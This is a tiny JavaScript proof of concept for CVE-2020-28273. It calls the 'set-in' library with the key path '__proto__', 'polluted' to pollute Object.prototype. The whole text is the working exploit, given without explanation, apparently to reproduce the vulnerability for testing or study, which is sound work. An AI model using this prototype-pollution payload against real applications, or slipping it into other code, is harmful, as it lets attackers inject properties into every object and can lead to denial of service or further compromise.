//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28273
  const si = require("set-in");
  const obj = {};

  si(obj, ["__proto__", "polluted"], "yes");
